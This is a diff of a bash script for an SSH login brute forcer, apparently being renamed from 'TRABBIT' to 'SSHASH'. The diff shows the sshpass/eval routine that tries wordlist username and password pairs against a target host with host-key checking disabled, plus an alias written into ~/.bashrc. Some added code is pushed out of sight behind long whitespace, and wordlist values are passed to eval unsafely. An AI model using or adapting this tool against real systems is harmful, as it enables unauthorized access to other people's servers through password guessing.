@@ -1,12 +1,11 @@
 #!/bin/bash
 
-alias_to_add='alias sshash="cd && chmod +x * && ./sshash"'
+alias_to_add='alias sshash="cd && cd SSHASH && chmod +x * && ./sshash"'
 
 if ! grep -qxF "$alias_to_add" ~/.bashrc; then
     echo "$alias_to_add" >> ~/.bashrc
     echo "Alias ajouté à ~/.bashrc"
-else
-    echo "L'alias est déjà présent dans ~/.bashrc"
+else                                                                           echo "L'alias est déjà présent dans ~/.bashrc"
 fi
 
 
@@ -14,8 +13,7 @@ clear
 trap 'echo -e "\nOperation aborted by the user."; exit' INT
 
 function test_ssh_password {
-    ssh_command="sshpass -p '$2' ssh -o StrictHostKeyChecking=no -p $3 $1@$4 'echo SSH Login Successful'"
-    if output=$(eval "$ssh_command" 2>&1); then
+    ssh_command="sshpass -p '$2' ssh -o StrictHostKeyChecking=no -p $3 $1@$4 'echo SSH Login Successful'"                                                 if output=$(eval "$ssh_command" 2>&1); then
         if [[ $output == *"SSH Login Successful"* ]]; then
             echo "SSH Login Successful - $1:$2"
         else
@@ -59,18 +57,16 @@ fi
 IFS=$'\r\n' GLOBIGNORE='*' command eval 'users=($(cat "$userlist_path"))'
 IFS=$'\r\n' GLOBIGNORE='*' command eval 'passwords=($(cat "$passwordlist_path"))'
 
-echo "   ____ ____ _   _    _    ____ _   _   "
-echo "  |___ |___ | | | |  / \  |___ | | | |  "
-echo "  / ___/ ___| |_| | / _ \ / ___| |_| |  "
-echo " | (__| (___|  _  |/ ___ | (___|  _  |  "
-echo "  \____\____|_| |_/_/   \_\____|_| |_|  "
-echo "                              TRABBIT   "
+
+echo "         __. __..  ..__. __..  .  "
+echo "        (__ (__ |__|[__](__ |__|  "
+echo "        .__).__)|  ||  |.__)|  |  "
 echo
-echo "    * SSH CONNECTION BRUTE FORCER *     "
+echo "   * SSHASH CONNECTION BRUTE FORCER *   "
 echo "{>====================================<}"
 
 # Display target, port, and passlist filenames
-for i in "--{[+]TARGET} => $host_ip" "--{[+]PORT} => ${ssh_port:-22}" "--{[+]USERLIST} => $(basename "$userlist_path")" "--{[+]PASSLIST} => $(basename "$passwordlist_path")"; do
+for i in "|--{[+]TARGET} => $host_ip" "|--{[+]PORT} => ${ssh_port:-22}" "|--{[+]USERLIST} => $(basename "$userlist_path")" "|--{[+]PASSLIST} => $(basename "$passwordlist_path")"; do
     sleep 0.2
     echo "$i"
 done
